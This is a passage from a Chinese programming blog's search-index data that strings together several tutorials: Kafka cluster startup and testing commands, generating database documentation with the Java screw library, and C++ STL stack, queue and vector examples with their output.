server.properties、connect-standalone.properties、connect-distributed.properties、producer.properties、consumer.properties 配置文件 上述两个步骤完成后，节点二和节点三的最终配置如下： 123456# 节点二的配置broker.id=2listeners=PLAINTEXT://:9093log.dirs=/usr/local/kafka-cluster/kafka-node2/logsbootstrap.servers=localhost:9093 123456# 节点三的配置broker.id=3listeners=PLAINTEXT://:9094log.dirs=/usr/local/kafka-cluster/kafka-node3/logsbootstrap.servers=localhost:9094 集群管理 集群启动 注意 启动 Kafka 集群之前，必须确保 Zookeeper 集群已经启动成功，这是因为本文搭建的 Kafka 集群依赖于 Zookeeper 集群。 123456789# 后台启动# /usr/local/kafka-cluster/kafka-node1/bin/kafka-server-start.sh -daemon /usr/local/kafka-cluster/kafka-node1/config/server.properties# /usr/local/kafka-cluster/kafka-node2/bin/kafka-server-start.sh -daemon /usr/local/kafka-cluster/kafka-node2/config/server.properties# /usr/local/kafka-cluster/kafka-node3/bin/kafka-server-start.sh -daemon /usr/local/kafka-cluster/kafka-node3/config/server.properties# 或者前台启动（可直接查看启动时输出的日志信息）# /usr/local/kafka-cluster/kafka-node1/bin/kafka-server-start.sh /usr/local/kafka-cluster/kafka-node1/config/server.properties# /usr/local/kafka-cluster/kafka-node2/bin/kafka-server-start.sh /usr/local/kafka-cluster/kafka-node2/config/server.properties# /usr/local/kafka-cluster/kafka-node3/bin/kafka-server-start.sh /usr/local/kafka-cluster/kafka-node3/config/server.properties 查看状态 集群启动后，可以使用以下命令查看集群的运行状态。如果发现集群启动失败，则可以使用前台的方式再次启动集群，然后根据终端输出的错误日志信息来定位问题。 12345678910# 查看端口占用情况# netstat -nplt | grep 9092# netstat -nplt | grep 9093# netstat -nplt | grep 9094# 查看Kafka进程# ps -aux | grep kafka# 查看Java进程# jps -l 集群关闭 注意 关闭 Kafka 集群时，一定要等 Kafka 所有节点进程全部关闭后再关闭 Zookeeper 集群。因为 Zookeeper 集群当中记录着 Kafka 集群的相关信息，Zookeeper 集群一旦先关闭，Kafka 集群就没有办法再获取关闭进程的信息，此时只能手动强制杀死 Kafka 进程。 123# /usr/local/kafka-cluster/kafka-node1/bin/kafka-server-stop.sh stop# /usr/local/kafka-cluster/kafka-node2/bin/kafka-server-stop.sh stop# /usr/local/kafka-cluster/kafka-node3/bin/kafka-server-stop.sh stop 清空数据 若希望清空 Kafka 集群的数据，则可以按照以下步骤操作。清空数据的操作不可恢复，生产环境下慎用。 第一步：关闭 Kafka 集群第二步：连接 Zookeeper 集群，然后删除 /kafka 目录第三步：删除 Kafka 各个集群节点的安装目录下的 logs 目录（文件夹）第四步：重启 Kafka 集群 集群测试 进入任意节点的安装目录下的 bin 目录 12# 进入安装目录# cd /usr/local/kafka-cluster/kafka-node1/bin 创建主题 12# 创建主题# ./kafka-topics.sh --create --bootstrap-server 127.0.0.1:9092 --replication-factor 3 --partitions 1 --topic test 查看主题列表 12# 查看主题列表# ./kafka-topics.sh --list --bootstrap-server 127.0.0.1:9092 查看主题详细信息 12# 查看主题详细信息# ./kafka-topics.sh --bootstrap-server 127.0.0.1:9092 --topic test --describe 启动控制台消费者 12# 启动消费者# ./kafka-console-consumer.sh --bootstrap-server 127.0.0.1:9092 --topic test --from-beginning 启动控制台生产者 12# 启动生产者# ./kafka-console-producer.sh --broker-list 127.0.0.1:9092 --topic test 生产者正常启动后，在生产者的控制台手动输入 hello kafka，消费者的控制台就可以消费到生产者的消息，并输出 hello kafka，这表示消费者成功消费了生产者发送的消息！ 参考博客 Kafka 集群搭建超详细教程 var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "type": "hexo", "id": "readmore-container", "name": "全栈技术驿站", "blogId": "96641-5333172926158-056", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "random": "0.9", "height": "auto", "expires": "365", "lockToc": "yes", "interval": "30", "baseUrl": "" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"linux"},{title:"Java 微信支付开发入门教程",url:"/posts/ba04f364.html",text:'前言 微信支付 - 官网 微信支付 - 官方开发文档 var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "type": "hexo", "id": "readmore-container", "name": "全栈技术驿站", "blogId": "96641-5333172926158-056", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "random": "0.9", "height": "auto", "expires": "365", "lockToc": "yes", "interval": "30", "baseUrl": "" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"java 在线支付"},{title:"Java 自动生成数据库文档",url:"/posts/28df7196.html",text:'前言在企业级开发中，我们经常会有编写数据库文档的时间付出，关于数据库文档的状态：要么没有、要么有但都是手写、后期运维开发都需要手动对文档进行维护，很是繁琐。如果忘记一次维护就会给以后的工作造成很多困扰，这无形中留了很多坑给自己和后人。screw 是一款简洁好用的数据库文档生成工具，专为解决这一开发痛点而生。 screw 介绍特色功能 灵活扩展 支持自定义模板 支持多种数据库 支持多种格式的文档 简洁、轻量、设计良好 数据库支持 MySQL MariaDB TIDB Oracle SqlServer PostgreSQL Cache DB（2016） 文档类型支持 Html Word Markdown screw 使用基于 Java 代码第一种使用方式是基于 Java 代码，自动生成数据库文档。 Maven 依赖12345678910111213141516171819202122&lt;dependencies&gt; &lt;dependency&gt; &lt;groupId&gt;org.freemarker&lt;/groupId&gt; &lt;artifactId&gt;freemarker&lt;/artifactId&gt; &lt;version&gt;2.3.31&lt;/version&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;cn.smallbun.screw&lt;/groupId&gt; &lt;artifactId&gt;screw-core&lt;/artifactId&gt; &lt;version&gt;1.0.5&lt;/version&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;com.zaxxer&lt;/groupId&gt; &lt;artifactId&gt;HikariCP&lt;/artifactId&gt; &lt;version&gt;3.4.5&lt;/version&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;mysql&lt;/groupId&gt; &lt;artifactId&gt;mysql-connector-java&lt;/artifactId&gt; &lt;version&gt;8.0.20&lt;/version&gt; &lt;/dependency&gt;&lt;/dependencies&gt; Java 代码12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788import cn.smallbun.screw.core.Configuration;import cn.smallbun.screw.core.engine.EngineConfig;import cn.smallbun.screw.core.engine.EngineFileType;import cn.smallbun.screw.core.engine.EngineTemplateType;import cn.smallbun.screw.core.execute.DocumentationExecute;import cn.smallbun.screw.core.process.ProcessConfig;import com.zaxxer.hikari.HikariConfig;import com.zaxxer.hikari.HikariDataSource;import javax.sql.DataSource;import java.util.ArrayList;/** * 生成数据库文档 */public class ScrewTest { public static final String fileOutputDir = "D:/database/docs"; public static void main(String[] args) { documentGeneration(); } /** * 文档生成 */ public static void documentGeneration() { //数据源 HikariConfig hikariConfig = new HikariConfig(); hikariConfig.setDriverClassName("com.mysql.cj.jdbc.Driver"); hikariConfig.setJdbcUrl("jdbc:mysql://127.0.0.1:3306/database"); hikariConfig.setUsername("root"); hikariConfig.setPassword("123456"); //设置可以获取tables remarks信息 hikariConfig.addDataSourceProperty("useInformationSchema", "true"); hikariConfig.setMinimumIdle(2); hikariConfig.setMaximumPoolSize(5); DataSource dataSource = new HikariDataSource(hikariConfig); //生成配置 EngineConfig engineConfig = EngineConfig.builder() //生成文件路径 .fileOutputDir(fileOutputDir) //打开目录 .openOutputDir(true) //文件类型 .fileType(EngineFileType.HTML) //生成模板实现 .produceType(EngineTemplateType.freemarker) //自定义文件名称 .fileName("自定义文件名称").build(); //忽略表 ArrayList&lt;String&gt; ignoreTableName = new ArrayList&lt;&gt;(); //忽略表前缀 ArrayList&lt;String&gt; ignorePrefix = new ArrayList&lt;&gt;(); //忽略表后缀 ArrayList&lt;String&gt; ignoreSuffix = new ArrayList&lt;&gt;(); ProcessConfig processConfig = ProcessConfig.builder() //指定生成逻辑、当存在指定表、指定表前缀、指定表后缀时，将生成指定表，其余表不生成、并跳过忽略表配置 //根据名称指定表生成 .designatedTableName(new ArrayList&lt;&gt;()) //根据表前缀生成 .designatedTablePrefix(new ArrayList&lt;&gt;()) //根据表后缀生成 .designatedTableSuffix(new ArrayList&lt;&gt;()) //忽略表名 .ignoreTableName(ignoreTableName) //忽略表前缀 .ignoreTablePrefix(ignorePrefix) //忽略表后缀 .ignoreTableSuffix(ignoreSuffix).build(); //配置 Configuration config = Configuration.builder() //版本 .version("1.0.0") //描述 .description("数据库设计文档生成") //数据源 .dataSource(dataSource) //生成配置 .engineConfig(engineConfig) //生成配置 .produceConfig(processConfig) .build(); //执行生成 new DocumentationExecute(config).execute(); }} 基于 Maven 插件第二种使用方式是基于 Maven 插件，自动生成数据库文档。 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455&lt;build&gt; &lt;plugins&gt; &lt;plugin&gt; &lt;groupId&gt;cn.smallbun.screw&lt;/groupId&gt; &lt;artifactId&gt;screw-maven-plugin&lt;/artifactId&gt; &lt;version&gt;${lastVersion}&lt;/version&gt; &lt;dependencies&gt; &lt;!-- HikariCP --&gt; &lt;dependency&gt; &lt;groupId&gt;com.zaxxer&lt;/groupId&gt; &lt;artifactId&gt;HikariCP&lt;/artifactId&gt; &lt;version&gt;3.4.5&lt;/version&gt; &lt;/dependency&gt; &lt;!--mysql driver--&gt; &lt;dependency&gt; &lt;groupId&gt;mysql&lt;/groupId&gt; &lt;artifactId&gt;mysql-connector-java&lt;/artifactId&gt; &lt;version&gt;8.0.20&lt;/version&gt; &lt;/dependency&gt; &lt;/dependencies&gt; &lt;configuration&gt; &lt;!--username--&gt; &lt;username&gt;root&lt;/username&gt; &lt;!--password--&gt; &lt;password&gt;123456&lt;/password&gt; &lt;!--driver--&gt; &lt;driverClassName&gt;com.mysql.cj.jdbc.Driver&lt;/driverClassName&gt; &lt;!--jdbc url--&gt; &lt;jdbcUrl&gt;jdbc:mysql://127.0.0.1:3306/database&lt;/jdbcUrl&gt; &lt;!--生成文件类型--&gt; &lt;fileType&gt;HTML&lt;/fileType&gt; &lt;!--打开文件输出目录--&gt; &lt;openOutputDir&gt;false&lt;/openOutputDir&gt; &lt;!--生成模板--&gt; &lt;produceType&gt;freemarker&lt;/produceType&gt; &lt;!--文档名称 为空时:将采用[数据库名称-描述-版本号]作为文档名称--&gt; &lt;fileName&gt;测试文档名称&lt;/fileName&gt; &lt;!--描述--&gt; &lt;description&gt;数据库文档生成&lt;/description&gt; &lt;!--版本--&gt; &lt;version&gt;${project.version}&lt;/version&gt; &lt;!--标题--&gt; &lt;title&gt;数据库文档&lt;/title&gt; &lt;/configuration&gt; &lt;executions&gt; &lt;execution&gt; &lt;phase&gt;compile&lt;/phase&gt; &lt;goals&gt; &lt;goal&gt;run&lt;/goal&gt; &lt;/goals&gt; &lt;/execution&gt; &lt;/executions&gt; &lt;/plugin&gt; &lt;/plugins&gt;&lt;/build&gt; 扩展模块在日常的开发中，经过需求分析、建模之后，往往会先在数据库中建表，其次再进行代码的开发。使用 POJO 生成功能可以直接根据数据库表生成对应的 Java POJO 对象，这可以帮助开发人员节省一些重复劳动。screw 支持 POJO 生成功能，目前处于初步开发的状态，且仅支持 MySQL 数据库。 POJO 生成模块12345&lt;dependency&gt; &lt;groupId&gt;cn.smallbun.screw&lt;/groupId&gt; &lt;artifactId&gt;screw-extension&lt;/artifactId&gt; &lt;version&gt;${lastVersion}&lt;/version&gt; &lt;/dependency&gt; 123456789101112131415161718192021222324252627282930313233343536373839404142/** * POJO 生成 */void pojoGeneration() { //数据源 HikariConfig hikariConfig = new HikariConfig(); hikariConfig.setDriverClassName("com.mysql.cj.jdbc.Driver"); hikariConfig.setJdbcUrl("jdbc:mysql://127.0.0.1:3306/database"); hikariConfig.setUsername("root"); hikariConfig.setPassword("123456"); //设置可以获取tables remarks信息 hikariConfig.addDataSourceProperty("useInformationSchema", "true"); hikariConfig.setMinimumIdle(2); hikariConfig.setMaximumPoolSize(5); DataSource dataSource = new HikariDataSource(hikariConfig); ProcessConfig processConfig = ProcessConfig.builder() //指定生成逻辑、当存在指定表、指定表前缀、指定表后缀时，将生成指定表，其余表不生成、并跳过忽略表配置 //根据名称指定表生成 .designatedTableName(new ArrayList&lt;&gt;()) //根据表前缀生成 .designatedTablePrefix(new ArrayList&lt;&gt;()) //根据表后缀生成 .designatedTableSuffix(new ArrayList&lt;&gt;()).build(); //设置生成pojo相关配置 PojoConfiguration config = new PojoConfiguration(); //设置文件存放路径 config.setPath("/cn/smallbun/screw/"); //设置包名 config.setPackageName("cn.smallbun.screw"); //设置是否使用lombok config.setUseLombok(false); //设置数据源 config.setDataSource(dataSource); //设置命名策略 config.setNameStrategy(new HumpNameStrategy()); //设置表过滤逻辑 config.setProcessConfig(processConfig); //执行生成 new PojoExecute(config).execute();} 常见问题问题一 生成的数据库文档出现乱码？ 在连接 MySQL 的 URL 中加入 characterEncoding=UTF-8 即可 问题二 MySQL 数据库表和列字段有注释，但生成的数据库文档却没有注释？ 在连接 MySQL 的 URL 中加入 useInformationSchema=true 即可 问题三 运行抛出异常： Caused by: java.lang.NoSuchFieldError: VERSION_2_3_30 检查项目中 freemarker 的依赖版本，这是由于版本过低造成的，升级版本为 2.3.30 即可 问题四 运行抛出异常： java.lang.AbstractMethodError: com.mysql.jdbc.JDBC4Connection.getSchema()Ljava/lang/String; 这是因为 MySQL 驱动的版本过低造成的，升级 MySQL 驱动的版本为最新即可 问题五 运行抛出异常： java.lang.AbstractMethodError: oracle.jdbc.driver.T4CConnection.getSchema()Ljava/lang/String; 这是因为 Oracle 驱动版本过低造成的，删除或屏蔽当前的驱动版本，并将驱动升级为以下版本： 12345678910&lt;dependency&gt; &lt;groupId&gt;com.oracle.ojdbc&lt;/groupId&gt; &lt;artifactId&gt;ojdbc8&lt;/artifactId&gt; &lt;version&gt;19.3.0.0&lt;/version&gt;&lt;/dependency&gt;&lt;dependency&gt; &lt;groupId&gt;cn.easyproject&lt;/groupId&gt; &lt;artifactId&gt;orai18n&lt;/artifactId&gt; &lt;version&gt;12.1.0.2.0&lt;/version&gt;&lt;/dependency&gt; 文档生成截图 var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "type": "hexo", "id": "readmore-container", "name": "全栈技术驿站", "blogId": "96641-5333172926158-056", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "random": "0.9", "height": "auto", "expires": "365", "lockToc": "yes", "interval": "30", "baseUrl": "" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"java 数据库"},{title:"Golang 入门教程之一",url:"/posts/42f8c3d7.html",text:"",tags:"golang"},{title:"C++ 进阶基础之八",url:"/posts/8b87f2be.html",text:'大纲 C++ 进阶基础之一、C++ 进阶基础之二、C++ 进阶基础之三 C++ 进阶基础之四、C++ 进阶基础之五、C++ 进阶基础之六 C++ 进阶基础之七、C++ 进阶基础之八 stack 容器stack 容器的概念stack 是一种先进后出（First In Last Out，FILO）的数据结构，它只有一个出口。stack 容器允许新增元素、移除元素、取得栈顶元素，但是除了最顶端的元素外，没有任何其他方法可以存取 stack 中的其他元素。stack 没有迭代器，容器中所有元素的进出都必须符合 “先进后出” 的规则，只有 stack 最顶端的元素，才有机会被外界取用。换言之，stack 不提供遍历功能，也不提供迭代器。deque 是双向开口的数据结构，若以 deque 为底部结构并封闭其头端开口，便轻而易举地形成一个 stack。因此，SGI STL 便以 deque 作为缺省情况下的 stack 底部结构。由于 stack 以底部容器完成其所有工作，而具有这种 “修改某物接口，形成另一种风貌” 的性质者，称为 adapter（配接器），因此，STL stack 往往不被归类为 container（容器），而被归类为 container adapter（容器配接器）。 stack 容器的使用12345678910111213141516171819202122232425262728293031323334#include&lt;iostream&gt;#include&lt;stack&gt;using namespace std;void printStack(stack&lt;int&gt; &amp;s) { // 判断容器是否为空 while (!s.empty()) { // 获取栈顶元素 cout &lt;&lt; s.top() &lt;&lt; " "; // 弹出栈顶元素（弹栈） s.pop(); } cout &lt;&lt; endl;}int main() { // 默认构造函数 stack&lt;int&gt; s1; // 向栈顶添加元素（压栈） s1.push(5); s1.push(12); s1.push(24); s1.push(35); s1.push(46); printStack(s1); // 拷贝构造函数 stack&lt;int&gt; s2 = s1; return 0;} 程序运行输出的结果如下： 146 35 24 12 5 queue 容器queue 容器的概念queue 是一种先进先出（First In First Out，FIFO）的数据结构，它有两个出口。queue 容器允许从一端新增元素，从另一端移除元素。queue 所有元素的进出都必须符合 ” 先进先出” 的规则，只有 queue 的顶端元素，才有机会被外界取用。queue 不提供遍历功能，也不提供迭代器。由于 queue 以底部容器完成其所有工作，因此，STL queue 往往也不被归类为 container（容器），而被归类为 container adapter（容器配接器）。 queue 容器的使用1234567891011121314151617181920212223242526272829303132333435363738394041424344#include&lt;iostream&gt;#include&lt;queue&gt;using namespace std;void printQueue(queue&lt;int&gt; &amp;q) { // 判断队列是否为空 while (!q.empty()) { cout &lt;&lt; "大小: " &lt;&lt; q.size() &lt;&lt; endl; cout &lt;&lt; "队头: " &lt;&lt; q.front() &lt;&lt; endl; cout &lt;&lt; "队尾: " &lt;&lt; q.back() &lt;&lt; endl; // 弹出（删除）队头元素 q.pop(); }}int main() { // 默认构造函数 queue&lt;int&gt; q1; // 往队尾添加元素 q1.push(1); q1.push(3); q1.push(5); q1.push(7); q1.push(9); // 返回队列的大小 cout &lt;&lt; "size = " &lt;&lt; q1.size() &lt;&lt; endl; // 返回第一个元素 cout &lt;&lt; "first = " &lt;&lt; q1.front() &lt;&lt; endl; // 返回最后一个元素 cout &lt;&lt; "last = " &lt;&lt; q1.back() &lt;&lt; endl; printQueue(q1); // 拷贝构造函数 queue&lt;int&gt; q2 = q1; return 0;} 程序运行输出的结果如下： 123456789101112131415161718size = 5first = 1last = 9大小: 5队头: 1队尾: 9大小: 4队头: 3队尾: 9大小: 3队头: 5队尾: 9大小: 2队头: 7队尾: 9大小: 1队头: 9队尾: 9 var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "type": "hexo", "id": "readmore-container", "name": "全栈技术驿站", "blogId": "96641-5333172926158-056", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "random": "0.9", "height": "auto", "expires": "365", "lockToc": "yes", "interval": "30", "baseUrl": "" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"c++"},{title:"C++ 进阶基础之七",url:"/posts/9e89901e.html",text:'大纲 C++ 进阶基础之一、C++ 进阶基础之二、C++ 进阶基础之三 C++ 进阶基础之四、C++ 进阶基础之五、C++ 进阶基础之六 C++ 进阶基础之七、C++ 进阶基础之八 vector 容器vector 容器的概念vector 的数据存储以及操作方式，与 Array 非常相似，两者的唯一差别在于空间运用的灵活性。Array 是静态空间，一旦配置了就不能改变，要换大一点或者小一点的空间，可以，一切琐碎的细节得由自己来实现；首先配置一块新的空间，然后将旧空间的数据搬往新空间，再释放原来的空间。Vector 是动态空间，随着元素的加入，它的内部机制会自动扩充空间以容纳新元素。因此 vector 的运用对于内存的合理利用与运用的灵活性有很大的帮助，我们再也不必害怕空间不足而一开始就初始化一个大的 Array 了。Vector 的实现技术，关键在于其对大小的控制以及重新配置时的数据移动效率，一旦 vector 旧空间满了，如果客户每新增一个元素 vector 内部只是扩充一个元素的空间，实为不智，因为所谓的扩充空间（不论多大），一如刚所说，是 “配置新空间 - 数据移动 - 释放旧空间” 的大工程，时间成本很高，应该加入某种未雨绸缪的考虑。 vector 容器的数据结构 vector 所采用的数据结构是线性连续空间（单向开口的连续内存空间），它以两个迭代器（_Myfirst 和 _Mylast）分别指向配置得来的连续空间中目前已被使用的范围，并以迭代器 _Myend 指向整块连续内存空间的尾端。vector 往尾部添加或移除元素的效率非常高，但是往头部或者中部插入元素或移除元素则比较费时。为了降低空间配置时的速度成本，vector 实际配置的大小可能比客户端需求大一些，以应付将来可能的扩充，这里是容量的概念。换句话说，一个 vector 的容量永远大于或等于其大小，一旦容量等于大小，便是满载，下次再需要新增元素时，整个 vector 容器就得另觅居所。值得一提的是，所谓动态增加大小，并不是在原空间之后续接新空间（因为无法保证原空间之后尚有可配置的空间），而是申请一块更大的内存空间，然后将原数据拷贝到新空间，并释放原空间。因此，对 vector 的任何操作，一旦引起空间的重新配置，指向原 vector 的所有迭代器就都失效了，这是程序容易出错的地方，务必小心。 vector 容器的迭代器vector 维护了一个线性空间，所以不论元素的类型是什么，普通指针都可以作为 vector 的迭代器，因为 vector 迭代器所需要的操作行为，如 operaroe*, operator-&gt;, operator++, operator--, operator+, operator-, operator+=, operator-= 都是普通指针天生具备的。vector 支持随机存取，而普通指针正有着这样的能力，所以 vector 提供的是随机访问迭代器（Random Access Iterators），支持随机存取元素。根据前面的描述，可以写如下的代码： 123456789101112131415161718192021222324#include&lt;iostream&gt;#include&lt;vector&gt;using namespace std;int main() { // 声明容器 vector&lt;int&gt; v1; // 插入容器数据 for (int i = 0; i &lt; 10; i++) { v1.push_back(i); cout &lt;&lt; i &lt;&lt; " "; } cout &lt;&lt; endl; // vector 的迭代器是随机访问迭代器，支持跳跃式访问（随机存取元素） vector&lt;int&gt;::iterator itBegin = v1.begin(); itBegin = itBegin + 2; cout &lt;&lt; *itBegin &lt;&lt; endl; return 0;} 程序运行输出的结果如下： 120 1 2 3 4 5 6 7 8 9 2 vector 容器的使用vector 的构造与赋值1234vector&lt;T&gt; v; // 默认构造函数，采用模板实现类实现vector(v.begin(), v.end()); // 有参构造函数，将 v[begin(), end()] 区间中的元素拷贝给本身vector(n, elem); // 有参构造函数，将 n 个 elem 元素拷贝给本身vector(const vector &amp;vec); // 拷贝构造函数 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960#include &lt;iostream&gt;#include&lt;vector&gt;using namespace std;void printVector(vector&lt;int&gt; &amp;v) { // 遍历容器 for (vector&lt;int&gt;::iterator it = v.begin(); it != v.end(); it++) { cout &lt;&lt; *it &lt;&lt; " "; } cout &lt;&lt; endl;}int main() { int arr[] = {1, 2, 3, 4, 5}; cout &lt;&lt; "------ vector 构造函数 ------" &lt;&lt; endl; // 默认构造函数 vector&lt;int&gt; v1; // 有参构造函数，将 v[begin(), end()] 区间中的元素拷贝给本身 vector&lt;int&gt; v2(arr, arr + sizeof(arr) / sizeof(int)); printVector(v2); // 有参构造函数，将 v[begin(), end()] 区间中的元素拷贝给本身 vector&lt;int&gt; v3(v2.begin(), v2.end()); printVector(v3); // 有参构造函数，将 n 个 elem 元素拷贝给本身 vector&lt;int&gt; v4(5, 10); printVector(v4); // 拷贝构造函数 vector&lt;int&gt; v5 = v4; printVector(v5); cout &lt;&lt; "------ vector 赋值操作 ------" &lt;&lt; endl; // 赋值操作，将 v[begin(), end()] 区间中的元素拷贝给本身 vector&lt;int&gt; v6; v6.assign(v5.begin(), v5.end()); printVector(v6); // 赋值操作，将 n 个 elem 元素拷贝给本身 vector&lt;int&gt; v7; v7.assign(5, 8); printVector(v7); // 赋值操作，重载等号操作符 vector&lt;int&gt; v8; v8 = v6; printVector(v8); // 赋值操作，将其他容器与本身的元素互换，利用 swap() 可以收缩空间 v8.swap(v7); printVector(v8); return 0;} 程序运行输出的结果如下： 12345678910------ vector 构造函数 ------1 2 3 4 5 1 2 3 4 5 10 10 10 10 10 10 10 10 10 10 ------ vector 赋值操作 ------10 10 10 10 10 8 8 8 8 8 10 10 10 10 10 8 8 8 8 8 vector 的常用操作12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788899091929394#include &lt;iostream&gt;#include &lt;vector&gt;using namespace std;void printVector(vector&lt;int&gt; &amp;v) { // 遍历vector for (vector&lt;int&gt;::iterator it = v.begin(); it != v.end(); it++) { cout &lt;&lt; *it &lt;&lt; " "; } cout &lt;&lt; endl;}int main() { vector&lt;int&gt; v1; v1.assign(5, 10); cout &lt;&lt; "------ vector 大小、容量操作 ------" &lt;&lt; endl; // 获取容器中元素的个数 size_t size = v1.size(); cout &lt;&lt; "size = " &lt;&lt; size &lt;&lt; endl; // 判断容器是否为空 bool empty = v1.empty(); cout &lt;&lt; (empty == 0 ? "true" : "false") &lt;&lt; endl; // 重新指定容器的大小为 num，若容器变大，则以默认值（0）填充新位置。如果容器变小，则末尾超出容器大小的元素会被删除 v1.resize(7); printVector(v1); // 重新指定容器的大小为 num，若容器变大，则以指定值填充新位置。如果容器变小，则末尾超出容器大小的元素会被删除 v1.resize(10, 8); printVector(v1); // 获取容器的容量 size_t capacity = v1.capacity(); cout &lt;&lt; "capacity = " &lt;&lt; capacity &lt;&lt; endl; cout &lt;&lt; "------ vector 数据读取操作 ------" &lt;&lt; endl; vector&lt;int&gt; v2; v2.push_back(3); v2.push_back(6); v2.push_back(9); v2.push_back(12); v2.push_back(15); // 返回索引所指向的数据，如果索引越界，抛出 out_of_range 异常 int num1 = v2.at(1); cout &lt;&lt; "num1 = " &lt;&lt; num1 &lt;&lt; endl; // 返回索引所指向的数据，如果索引越界，程序终止运行 int num2 = v2[3]; cout &lt;&lt; "num2 = " &lt;&lt; num2 &lt;&lt; endl; // 返回容器中第一个数据元素 int font = v2.front(); cout &lt;&lt; "font = " &lt;&lt; font &lt;&lt; endl; // 返回容器中最后一个数据元素 int back = v2.back(); cout &lt;&lt; "back = " &lt;&lt; back &lt;&lt; endl; cout &lt;&lt; "------ vector 插入和删除操作 ------" &lt;&lt; endl; // 往迭代器指向的位置插入 n 个指定的元素，其中元素个数可以省略 vector&lt;int&gt; v3(5, 8); v3.insert(v3.begin(), 2, 10); printVector(v3); // 往容器的尾部插入元素 v3.push_back(11); printVector(v3); // 删除最后一个元素 v3.pop_back(); printVector(v3); // 删除迭代器指向的元素，迭代器就是指针 v3.erase(v3.begin()); printVector(v3); // 删除迭代器从 start 到 end 之间的元素 v3.erase(v3.begin(), v3.end()); if (v3.empty()) { cout &lt;&lt; "vector is empty" &lt;&lt; endl; } // 删除容器中的所有元素 v3.clear(); return 0;} 程序运行输出的结果如下： 1234567891011121314151617------ vector 大小、容量操作 ------size = 5true10 10 10 10 10 0 0 10 10 10 10 10 0 0 8 8 8 capacity = 10------ vector 数据存取操作 ------num1 = 6num2 = 12font = 3back = 15------ vector 插入和删除操作 ------10 10 8 8 8 8 8 10 10 8 8 8 8 8 11 10 10 8 8 8 8 8 10 8 8 8 8 8 vector is empty vector 逆序遍历容器迭代器的类型： iterator：普通迭代器 const_iterator：只读迭代器 reverse_iterator：逆序迭代器 1234567891011121314151617181920212223242526272829303132#include&lt;iostream&gt;#include&lt;vector&gt;using namespace std;int main() { vector&lt;int&gt; v1; for (int i = 0; i &lt; 10; i++) { v1.push_back(i); } // 顺序遍历容器 for (vector&lt;int&gt;::iterator it = v1.begin(); it != v1.end(); it++) { cout &lt;&lt; *it &lt;&lt; " "; } cout &lt;&lt; endl; // 逆序遍历容器（使用逆序迭代器） for (vector&lt;int&gt;::reverse_iterator it = v1.rbegin(); it != v1.rend(); it++) { cout &lt;&lt; *it &lt;&lt; " "; } cout &lt;&lt; endl; // vector 的迭代器是随机访问迭代器，支持跳跃式访问 vector&lt;int&gt;::iterator itBegin = v1.begin(); itBegin = itBegin + 2; cout &lt;&lt; *itBegin &lt;&lt; endl; return 0;} 程序运行输出的结果如下： 1230 1 2 3 4 5 6 7 8 9 9 8 7 6 5 4 3 2 1 0 2 vector 收缩空间结合 C++ 的匿名对象和 vector 容器的 swap() 函数，可以实现收缩 vector 容器的空间。 12345678910111213141516171819202122232425262728#include &lt;iostream&gt;#include&lt;vector&gt;using namespace std;int main() { vector&lt;int&gt; v1; // 插入容器数据 for (int i = 0; i &lt; 100000; i++) { v1.push_back(i); } cout &lt;&lt; "size = " &lt;&lt; v1.size() &lt;&lt; endl; cout &lt;&lt; "capacity = " &lt;&lt; v1.capacity() &lt;&lt; endl; // 重新指定容器的大小，此时容器的容量不会改变 v1.resize(5); cout &lt;&lt; "size = " &lt;&lt; v1.size() &lt;&lt; endl; cout &lt;&lt; "capacity = " &lt;&lt; v1.capacity() &lt;&lt; endl; // 巧用匿名对象和 swap() 函数收缩 vector 容器的空间 vector&lt;int&gt;(v1).swap(v1); cout &lt;&lt; "size = " &lt;&lt; v1.size() &lt;&lt; endl; cout &lt;&lt; "capacity = " &lt;&lt; v1.capacity() &lt;&lt; endl; return 0;} 程序运行输出的结果如下： 123456size = 100000capacity = 131072size = 5capacity = 131072size = 5capacity = 5 vector 预留空间reserve() 函数可以让 vector 容器预留指定的空间，尤其在大数据量插入的情况下，这可以减少 vector 容器频繁扩充容量带来的额外性能开销，从而提升程序的运行效率。 123456789101112131415161718192021222324252627282930313233343536#include&lt;iostream&gt;#include&lt;vector&gt;using namespace std;void initData(vector&lt;int&gt; 